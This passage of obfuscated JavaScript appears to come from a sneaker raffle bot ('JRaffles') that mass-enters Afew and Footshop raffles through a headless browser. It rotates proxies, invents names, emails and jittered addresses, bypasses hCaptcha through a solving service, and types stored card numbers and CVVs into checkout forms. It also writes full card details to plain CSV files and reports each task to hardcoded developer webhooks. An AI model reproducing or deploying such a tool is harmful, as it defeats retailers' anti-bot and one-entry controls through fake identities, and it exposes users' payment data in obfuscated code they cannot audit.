                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x27fc20['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x4ca7a9,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x27fc20['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x4c3205['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x4351c2,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x57e698['data'];
                            } else {
                                if (_0x5c1cfe && _0x19110d == 'ver') {
                                    var _0x57e698 = new _0x2b40cb()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x27fc20['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x4ca7a9,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x1c27ab,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x27fc20['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x4c3205['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x4351c2,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x57e698['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3e9f80(_0x1cc796, _0x16e833) {
    var _0x6f9566 = _0x1cc796[_0x16e833]['Address1']['split'](''), _0x232b35 = _0x1cc796[_0x16e833]['Address2']['split'](''), _0x1e9bd5 = _0x1cc796[_0x16e833]['Email']['split']('@');
    for (var _0x226dcb = 0x0; _0x226dcb < _0x6f9566['length']; _0x226dcb++) {
        if (_0x6f9566[_0x226dcb] == 'X') {
            var _0x3c3ccd = Math['round'](Math['random']() * (_0x341bde['length'] - 0x1));
            _0x6f9566[_0x226dcb] = _0x564ac6[_0x3c3ccd];
        }
    }
    ;
    for (var _0x226dcb = 0x0; _0x226dcb < _0x232b35['length']; _0x226dcb++) {
        if (_0x232b35[_0x226dcb] == 'X') {
            var _0x3c3ccd = Math['round'](Math['random']() * (_0x341bde['length'] - 0x1));
            _0x232b35[_0x226dcb] = _0x564ac6[_0x3c3ccd];
        }
    }
    ;
    _0x1cc796[_0x16e833]['FirstName'] == 'RANDOM' && (_0x1cc796[_0x16e833]['FirstName'] = _0xdae2db['first']());
    _0x1cc796[_0x16e833]['LastName'] == 'RANDOM' && (_0x1cc796[_0x16e833]['LastName'] = _0xdae2db['last']());
    _0x1e9bd5[0x0] == 'RANDOM' ? _0x1e9bd5[0x0] = '' + _0xdae2db['first']() + _0xdae2db['last']() + '@' : _0x1e9bd5[0x0] = _0x1e9bd5[0x0] + '@';
    _0x1cc796[_0x16e833]['Email'] = _0x1e9bd5['join'](''), _0x1cc796[_0x16e833]['Address1'] = _0x6f9566['join'](''), _0x1cc796[_0x16e833]['Address2'] = _0x232b35['join']('');
    _0x1cc796[_0x16e833]['Phone'] == 'RANDOM' && (_0x1cc796[_0x16e833]['Phone'] = '0' + _0x3b3e48(0x5f5e100, 0x3b9ac9ff));
    if (_0x1cc796[_0x16e833]['Follower'] == 'RANDOM') {
        var _0x2e937d = _0x3b3e48(0x1, 0x270f);
        _0x1cc796[_0x16e833]['Follower'] = '' + _0xdae2db['first']() + _0xdae2db['last']() + _0x2e937d + '\x20';
    }
    _0x1cc796[_0x16e833]['HouseNumber'] == 'RANDOM' && (_0x1cc796[_0x16e833]['HouseNumber'] = _0x3b3e48(0x1, 0xc8));
    if (_0x1cc796[_0x16e833]['Address1'] == 'RANDOM') {
        var _0x4ded4a = Math['round'](Math['random']() * (_0x341bde['length'] - 0x1)), _0x3ee3e5 = _0x564ac6[_0x4ded4a];
        _0x1cc796[_0x16e833]['Address1'] = _0xdae2db['last']() + 'straat', _0x1cc796[_0x16e833]['Zip'] == '' && (_0x1cc796[_0x16e833]['Postcode'] = _0x3b3e48(0x3e8, 0x270f) + '\x20' + _0x3ee3e5 + _0x3ee3e5, _0x1cc796[_0x16e833]['Zip'] = _0x1cc796[_0x16e833]['Postcode']), _0x1cc796[_0x16e833]['HouseNumber'] = '' + _0x3b3e48(0x1, 0xc8);
    }
    return;
}
;
async function _0x20b8ba(_0x140a58, _0x219b0c) {
    _0x3fdbd7['appendFileSync']('../failed-tasks.csv', _0x55e366() + ',' + _0x219b0c['store'] + ',' + _0x219b0c['name'] + ',' + _0x140a58['Url'] + ',' + _0x140a58['Size'] + ',' + _0x140a58['Follower'] + ',' + _0x140a58['FirstName'] + ',' + _0x140a58['LastName'] + ',' + _0x140a58['Address1'] + ',' + _0x140a58['Address2'] + ',' + _0x140a58['HouseNumber'] + ',' + _0x140a58['Zip'] + ',' + _0x140a58['City'] + ',' + _0x140a58['State'] + ',' + _0x140a58['Country'] + ',' + _0x140a58['Phone'] + ',' + _0x140a58['Email'] + ',' + _0x140a58['Password'] + ',' + _0x140a58['PaymentMethod'] + ',' + _0x140a58['CardType'] + ',' + _0x140a58['NameOnCard'] + ',' + _0x140a58['CardNumber'] + ',' + _0x140a58['ExpiryDate'] + ',' + _0x140a58['CVV'] + ',' + _0x140a58['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x4fb703(_0x1ea3f3, _0x563249) {
    _0x3fdbd7['appendFileSync']('../successful-tasks.csv', _0x55e366() + ',' + _0x563249['store'] + ',' + _0x563249['name'] + ',' + _0x1ea3f3['Url'] + ',' + _0x1ea3f3['Size'] + ',' + _0x1ea3f3['Follower'] + ',' + _0x1ea3f3['FirstName'] + ',' + _0x1ea3f3['LastName'] + ',' + _0x1ea3f3['Address1'] + ',' + _0x1ea3f3['Address2'] + ',' + _0x1ea3f3['HouseNumber'] + ',' + _0x1ea3f3['Zip'] + ',' + _0x1ea3f3['City'] + ',' + _0x1ea3f3['State'] + ',' + _0x1ea3f3['Country'] + ',' + _0x1ea3f3['Phone'] + ',' + _0x1ea3f3['Email'] + ',' + _0x1ea3f3['Password'] + ',' + _0x1ea3f3['PaymentMethod'] + ',' + _0x1ea3f3['CardType'] + ',' + _0x1ea3f3['NameOnCard'] + ',' + _0x1ea3f3['CardNumber'] + ',' + _0x1ea3f3['ExpiryDate'] + ',' + _0x1ea3f3['CVV'] + ',' + _0x1ea3f3['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x3e36fc() {
    let _0xa94c9b = proxyFile['split']('\x0a'), _0x508b59 = _0xa94c9b['map']((_0x1689c8, _0x2fb387) => {
        sanatizeProxy = _0x1689c8['replace']('\x0d', '');
        if (_0xa94c9b[_0x2fb387 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x508b59;
}
;
async function _0x24a99c(_0x1cb274) {
    var _0x51e6e5 = _0x1cb274[0x1]['split'](':');
    const _0x3e64e1 = await _0x4ec495['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x51e6e5[0x0] + ':' + _0x51e6e5[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x174f9b = await _0x3e64e1['newPage']();
        await _0x174f9b['authenticate']({
            'username': '' + _0x51e6e5[0x2],
            'password': '' + _0x51e6e5[0x3]
        }), console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x174f9b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x174f9b['setRequestInterception'](!![]), _0x174f9b['on']('request', _0x6c391b => {
            _0x6c391b['resourceType']() === 'image' || _0x6c391b['resourceType']() === 'font' || _0x6c391b['resourceType']() === 'media' ? _0x6c391b['abort']() : _0x6c391b['continue']();
        }), await _0x174f9b['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x21f008() + '\x20[' + _0x3962b3[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x174f9b['waitForTimeout'](0xbb8), await _0x174f9b['waitForSelector']('.product-card');
        const _0x1ff3ad = await _0x174f9b['$$eval']('a.product-card', _0x2c918b => {
            return _0x2c918b['map'](_0x50066d => _0x50066d['href']);
        });
        return _0x531a02 = _0x1ff3ad;
    } catch (_0x58e6fb) {
        console['log']('\x20' + _0x58e6fb);
    } finally {
        _0x3e64e1['close'](), console['clear']();
    }
}
;
async function _0x38445e(_0x32b64e, _0x549b69, _0x387eec, _0x4268ec, _0x13bcd1) {
    _0x549b69 != 'ver' && await _0x3e9f80(_0x4268ec, _0x32b64e);
    if (_0x4c3205['useRandomProxy'] = ![])
        var _0x527139 = _0x13bcd1[_0x32b64e]['split'](':');
    else
        var _0x448d93 = Math['round'](Math['random']() * (_0x13bcd1['length'] - 0x1)), _0x527139 = _0x13bcd1[_0x448d93]['split'](':');
    var _0x3d8bb7 = _0x387eec['data'];
    _0x549b69 != 'ver' && (_0x3d8bb7['data']['attributes']['properties']['$first_name'] = '' + _0x4268ec[_0x32b64e]['FirstName'], _0x3d8bb7['data']['attributes']['properties']['$last_name'] = '' + _0x4268ec[_0x32b64e]['LastName'], _0x3d8bb7['data']['attributes']['properties']['$address1'] = _0x4268ec[_0x32b64e]['Address1'] + '\x20' + _0x4268ec[_0x32b64e]['HouseNumber'] + '\x20' + _0x4268ec[_0x32b64e]['Address2'], _0x3d8bb7['data']['attributes']['properties']['$zip'] = '' + _0x4268ec[_0x32b64e]['Zip'], _0x3d8bb7['data']['attributes']['properties']['$city'] = '' + _0x4268ec[_0x32b64e]['City'], _0x3d8bb7['data']['attributes']['properties']['$country'] = '' + _0x4268ec[_0x32b64e]['Country'], _0x3d8bb7['data']['attributes']['properties']['Size'] = '' + _0x4268ec[_0x32b64e]['Size'], _0x3d8bb7['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x4268ec[_0x32b64e]['Follower'], _0x549b69 == 'exp' ? _0x3d8bb7['data']['attributes']['email'] = '' + _0x4268ec[_0x32b64e]['FirstName'] + _0x4268ec[_0x32b64e]['LastName'] + _0x4c3205['catchall'] : _0x3d8bb7['data']['attributes']['email'] = '' + _0x4268ec[_0x32b64e]['Email']);
    var _0x49f9d5 = {
        'jar': _0x45c692,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x387eec['url'],
        'headers': _0x387eec['headers'],
        'body': JSON['stringify'](_0x3d8bb7),
        'proxy': 'http://' + _0x527139[0x2] + ':' + _0x527139[0x3] + '@' + _0x527139[0x0] + ':' + _0x527139[0x1]
    };
    return _0x549b69 === 'ver' && (_0x49f9d5['method'] = 'GET'), new Promise(function (_0xad354, _0x18314f) {
        callback = async (_0x1db8c3, _0x387b09, _0x469572) => {
            if (!_0x1db8c3 && _0x387b09['statusCode'] == 0xca || !_0x1db8c3 && _0x387b09['statusCode'] == 0xc8) {
                _0xad354(console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x387eec['name'] + ']\x20Task\x20' + (_0x32b64e + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x549b69 != 'ver') {
                    _0x4fb703(_0x4268ec[_0x32b64e], _0x387eec);
                    var _0x2faf41 = await _0x5b798c(_0x4268ec[_0x32b64e], _0x387eec, 'dev', ![]), _0x35a10a = await _0x5b798c(_0x4268ec[_0x32b64e], _0x387eec, 'pub', ![]);
                    const _0x28dc41 = {
                        'succesDEVMSG': { 'embeds': [_0x2faf41] },
                        'succesPUBMSG': { 'embeds': [_0x35a10a] }
                    };
                    if (_0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '')
                        try {
                            await _0x331f59(_0x4c3205['webhook'], _0x28dc41['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x28dc41['succesDEVMSG']), await _0x4e5841(0xc8);
                    try {
                        await _0x331f59(_0x5ca215, _0x28dc41['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x549b69 == 'ver') {
                        var _0x2faf41 = await _0x5b798c(null, _0x387eec, 'ver', ![]);
                        const _0xf053f0 = {
                            'succesDEVMSG': { 'embeds': [_0x2faf41] },
                            'succesPUBMSG': { 'embeds': [_0x35a10a] }
                        };
                        await _0x331f59(_0x2d16bc, _0xf053f0['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x549b69 != 'ver') {
                    var _0x232721 = '' + _0x1db8c3, _0x2f8e82 = await _0x5b798c(_0x4268ec[_0x32b64e], _0x387eec, 'dev', !![], _0x232721), _0x5f420b = {};
                    _0x5f420b['errorDEV'] = { 'embeds': [_0x2f8e82] }, _0x20b8ba(_0x4268ec[_0x32b64e], _0x387eec), _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x5f420b['errorDEV']), await _0x331f59(_0x40d0b0, _0x5f420b['errorDEV']);
                }
                _0x18314f(console['log'](_0x21f008() + '\x20[' + _0x387eec['name'] + ']\x20Task\x20' + (_0x32b64e + 0x1) + ':\x20' + _0x1db8c3));
            }
        };
        try {
            _0x549b69 === 'ver' ? console['log'](_0x21f008() + '\x20[' + _0x387eec['name'] + ']\x20Task\x20' + (_0x32b64e + 0x1) + ':\x20Verifying.') : console['log'](_0x21f008() + '\x20[' + _0x387eec['name'] + ']\x20Task\x20' + (_0x32b64e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3d8bb7['data']['attributes']['email']), _0x306f3e(_0x49f9d5, callback);
        } catch (_0x3ee1d8) {
            console['log'](_0x21f008() + '\x20Task\x20' + (_0x32b64e + 0x1) + ':\x20' + _0x3ee1d8);
        }
    });
}
;
async function _0x9c0bbf(_0x395527, _0x5bd415, _0x7c7fd4) {
    _0x4ec495['use'](_0x21618b()), _0x4ec495['use'](_0x480aae({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x4c3205['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xedeaab = 0x0; _0xedeaab < _0x395527['length']; _0xedeaab++) {
        var _0xc98bfb;
        if (_0x3be4d6 != 'yes')
            var _0x3be4d6 = '', _0x157e4d = 0x0;
        var _0x433b31 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x4ca7a9
                },
                {
                    'name': 'Product',
                    'value': '' + _0x395527[_0xedeaab]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x395527[_0xedeaab]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x4c3205['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x4351c2
                }
            ]
        }], _0x6d1862 = await _0x5b798c(_0x395527[_0xedeaab], _0x7c7fd4, 'dev', ![]), _0x7077ff = await _0x5b798c(_0x395527[_0xedeaab], _0x7c7fd4, 'pub', ![]);
        const _0x2bf46c = {
            'succesDEVMSG': { 'embeds': [_0x6d1862] },
            'succesPUBMSG': { 'embeds': [_0x7077ff] }
        }, _0x196bce = { 'embeds': _0x433b31 };
        await _0x3e9f80(_0x395527, _0xedeaab);
        if (_0x395527[_0xedeaab]['Email'] == '' || _0x395527[_0xedeaab]['FirstName'] == '' || _0x395527[_0xedeaab]['LastName'] == '' || _0x395527[_0xedeaab]['Country'] == '' || _0x395527[_0xedeaab]['Size'] == '' || _0x395527[_0xedeaab]['Address1'] == '' || _0x395527[_0xedeaab]['Zip'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x395527[_0xedeaab]['Email'] == '' || _0x395527[_0xedeaab]['FirstName'] == '' || _0x395527[_0xedeaab]['LastName'] == '' || _0x395527[_0xedeaab]['Country'] == '' || _0x395527[_0xedeaab]['Size'] == '' || _0x395527[_0xedeaab]['Address1'] == '' || _0x395527[_0xedeaab]['Zip'] == '' || _0x395527[_0xedeaab]['Phone'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x412c9e = '' + _0x395527[_0xedeaab]['Url'];
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x1c2d44 = _0x5bd415[_0xedeaab]['split'](':');
        else
            var _0x156505 = Math['round'](Math['random']() * (_0x5bd415['length'] - 0x1)), _0x1c2d44 = _0x5bd415[_0x156505]['split'](':');
        const _0x399f3b = await _0x4ec495['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x1c2d44[0x0] + ':' + _0x1c2d44[0x1]]
        });
        try {
            const _0x5deff6 = await _0x399f3b['newPage']();
            await _0x5deff6['authenticate']({
                'username': '' + _0x1c2d44[0x2],
                'password': '' + _0x1c2d44[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5deff6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5deff6['setRequestInterception'](!![]), _0x5deff6['on']('request', _0x1e17cf => {
                _0x1e17cf['resourceType']() === 'image' || _0x1e17cf['resourceType']() === 'font' || _0x1e17cf['resourceType']() === 'media' ? _0x1e17cf['abort']() : _0x1e17cf['continue']();
            }), await _0x5deff6['goto'](_0x412c9e), await _0x4e5841(0xbb8), await _0x5deff6['waitForSelector']('.control__JhutY'), await _0x5deff6['click']('.control__JhutY'), await _0x4e5841(0x1f4);
            if (_0x395527[_0xedeaab]['Size'] != 'RANDOM')
                try {
                    const _0x1fc738 = await _0x5deff6['$x']('//div[contains(text(),\x20\x27' + _0x395527[_0xedeaab]['Size'] + '\x27)]');
                    await _0x1fc738[0x0]['click']();
                } catch {
                    console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x50ac6f = await _0x5deff6['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x187f37 = Math['round'](Math['random']() * (_0x50ac6f['length'] - 0x1));
                await _0x50ac6f[_0x187f37]['click']();
            }
            await _0x4e5841(0x4b0);
            const _0xb5d868 = await _0x5deff6['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0xb5d868[0x0]['click'](), await _0x5deff6['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x5deff6['type']('input[name=\x22email\x22]', '' + _0x395527[_0xedeaab]['Email']), await _0x4e5841(0x640), await _0x5deff6['type']('input[name=\x22phone\x22]', '' + _0x395527[_0xedeaab]['Phone']), await _0x4e5841(0x4b0), await _0x5deff6['click']('button.btn.continue-button__1RtsS'), await _0x4e5841(0x4b0);
            try {
                await _0x5deff6['type']('input[name=\x22firstName\x22]', '' + _0x395527[_0xedeaab]['FirstName']), await _0x4e5841(0x258);
            } catch {
                const _0x2be2dd = await _0x5deff6['$$eval']('.invalid-feedback\x20>\x20div', _0x139f77 => {
                    return _0x139f77['map'](_0x599165 => _0x599165['innerText']);
                });
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20' + _0x2be2dd));
                continue;
            }
            await _0x5deff6['type']('input[name=\x22lastName\x22]', '' + _0x395527[_0xedeaab]['LastName']), await _0x4e5841(0xc8), await _0x5deff6['type']('input[name=\x22instagramUsername\x22]', '' + _0x395527[_0xedeaab]['Follower']), await _0x4e5841(0x4b0), await _0x5deff6['click']('button.btn.continue-button__1RtsS'), await _0x4e5841(0x3e8), console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x5deff6['select']('select[name=\x22country\x22]', '' + _0x395527[_0xedeaab]['Country']), await _0x4e5841(0x2bc), await _0x5deff6['type']('input[name=\x22streetName\x22]', '' + _0x395527[_0xedeaab]['Address1']), await _0x4e5841(0x258), await _0x5deff6['type']('input[name=\x22houseNumber\x22]', _0x395527[_0xedeaab]['HouseNumber'] + '\x20' + _0x395527[_0xedeaab]['Address2']), await _0x4e5841(0xc8), await _0x5deff6['type']('input[name=\x22postalCode\x22]', '' + _0x395527[_0xedeaab]['Zip']), await _0x4e5841(0x1f4), await _0x5deff6['type']('input[name=\x22city\x22]', '' + _0x395527[_0xedeaab]['City']), await _0x4e5841(0x4b0), await _0x5deff6['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4e5841(0x4b0), await _0x5deff6['click']('button.btn.continue-button__1RtsS'), await _0x4e5841(0x4b0), console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x5deff6['solveRecaptchas'](), console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4e5841(0xbb8), await _0x5deff6['click']('button.btn.continue-button__1RtsS'), await _0x4e5841(0x1388), console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5deff6['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5deff6['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4e5841(0x4b0), await _0x5deff6['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x395527[_0xedeaab]['CardNumber']), await _0x4e5841(0x320), await _0x5deff6['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5deff6['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x395527[_0xedeaab]['ExpiryDate']), await _0x4e5841(0x4b0), await _0x5deff6['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5deff6['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x395527[_0xedeaab]['CVV']), await _0x4e5841(0x226), await _0x5deff6['type']('input[name=\x22holderName\x22]', '' + _0x395527[_0xedeaab]['NameOnCard']), await _0x4e5841(0x226), await _0x5deff6['click']('button.adyen-checkout__button'), console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x5deff6['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4e5841(0xbb8);
            } catch (_0x2d344e) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x203DS\x20Failed')), _0xc98bfb = '3DS\x20Error\x20' + _0x2d344e;
                var _0x316fc8 = await _0x5b798c(_0x395527[_0xedeaab], _0x7c7fd4, 'dev', !![], _0xc98bfb);
                _0x2bf46c['errorDEV'] = { 'embeds': [_0x316fc8] };
                _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x2bf46c['errorDEV']);
                await _0x331f59(_0x40d0b0, _0x2bf46c['errorDEV']);
                continue;
            }
            _0x4fb703(_0x395527[_0xedeaab], _0x7c7fd4), console['log'](_0x108b38['green'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '')
                try {
                    await _0x331f59(_0x4c3205['webhook'], _0x2bf46c['succesDEVMSG']);
                } catch {
                }
            await _0x4e5841(0xc8), await _0x331f59(_0x45c891, _0x2bf46c['succesDEVMSG']), await _0x4e5841(0xc8);
            try {
                await _0x331f59(_0x5ca215, _0x2bf46c['succesPUBMSG']);
            } catch {
            }
        } catch (_0x404eda) {
            console['log'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20' + _0x404eda), _0xc98bfb = '' + _0x404eda;
            var _0x316fc8 = await _0x5b798c(_0x395527[_0xedeaab], _0x7c7fd4, 'dev', !![], _0xc98bfb);
            _0x2bf46c['errorDEV'] = { 'embeds': [_0x316fc8] }, _0x4c3205['webhook'] != undefined && _0x4c3205['webhook'] != '' && await _0x331f59(_0x4c3205['webhook'], _0x2bf46c['errorDEV']), await _0x331f59(_0x40d0b0, _0x2bf46c['errorDEV']), _0x3be4d6 = 'yes';
        } finally {
            _0x399f3b['close']();
            if (_0x3be4d6 == 'yes' && _0x157e4d != 0x5) {
                console['log'](_0x108b38['red'](_0x21f008() + '\x20[' + _0x7c7fd4['name'] + ']\x20Task\x20' + (_0xedeaab + 0x1) + '\x20:\x20Retrying')), _0xedeaab = _0xedeaab - 0x1, _0x157e4d = _0x157e4d + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x4c3205['footshopDelay'] + '\x20ms'), await _0x4e5841(_0x4c3205['footshopDelay']);
        }
    }
}
afewFunction = async (_0xc933e6, _0x1776f6, _0x4c78af, _0x3beaca, _0x244390) => {
    for (var _0x2cc397 = 0x0; _0x2cc397 < _0x3beaca['length']; _0x2cc397++) {
        _0x4c3205['AfewDelay'] = _0x4c3205['delay'];
        var _0x2158a2;
        if (_0xa3d312 != 'yes')
            var _0xa3d312 = '', _0x5c7620 = 0x0;
        _0x3beaca[_0x2cc397]['Url'] = _0xc933e6, _0x4204b1(_0x4c78af['name'] + '\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20/\x20' + _0x3beaca['length'] + '\x20||\x20File:\x20' + _0x4a41d1 + '\x20Proxies:\x20' + _0x36f446), await _0x3e9f80(_0x3beaca, _0x2cc397);
        var _0x3b1424 = await _0x5b798c(_0x3beaca[_0x2cc397], _0x4c78af, 'dev', ![]), _0x1f4814 = await _0x5b798c(_0x3beaca[_0x2cc397], _0x4c78af, 'pub', ![]);
        const _0x1a99a2 = {
            'succesDEVMSG': { 'embeds': [_0x3b1424] },
            'succesPUBMSG': { 'embeds': [_0x1f4814] }
        };
        if (_0x3beaca[_0x2cc397]['Email'] == '' || _0x3beaca[_0x2cc397]['FirstName'] == '' || _0x3beaca[_0x2cc397]['LastName'] == '' || _0x3beaca[_0x2cc397]['Country'] == '' || _0x3beaca[_0x2cc397]['Size'] == '' || _0x3beaca[_0x2cc397]['Address1'] == '' || _0x3beaca[_0x2cc397]['Zip'] == '') {
            console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x4c3205['useRandomProxy'] = ![])
            var _0x566d5a = _0x244390[_0x2cc397]['split'](':');
        else
            var _0xffe550 = Math['round'](Math['random']() * (_0x244390['length'] - 0x1)), _0x566d5a = _0x244390[_0xffe550]['split'](':');
        const _0x35ca1c = await _0x4ec495['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x566d5a[0x0] + ':' + _0x566d5a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xcf2a76 = await _0x35ca1c['newPage']();
            await _0xcf2a76['setDefaultNavigationTimeout'](0x1d4c0), await _0xcf2a76['authenticate']({
                'username': '' + _0x566d5a[0x2],
                'password': '' + _0x566d5a[0x3]
            }), console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xcf2a76['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xcf2a76['setRequestInterception'](!![]), _0xcf2a76['on']('request', _0xa6f648 => {
                _0xa6f648['resourceType']() === 'image' || _0xa6f648['resourceType']() === 'font' || _0xa6f648['resourceType']() === 'media' ? _0xa6f648['abort']() : _0xa6f648['continue']();
            }), await _0xcf2a76['goto'](_0xc933e6, { 'waitUntil': 'networkidle2' }), console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0xcf2a76['waitForTimeout'](0xfa0), console['log'](_0x21f008() + '\x20[' + _0x4c78af['name'] + ']\x20Task\x20' + (_0x2cc397 + 0x1) + '\x20:\x20Cookies\x20received'), await _0xcf2a76['waitForTimeout'](0x320);
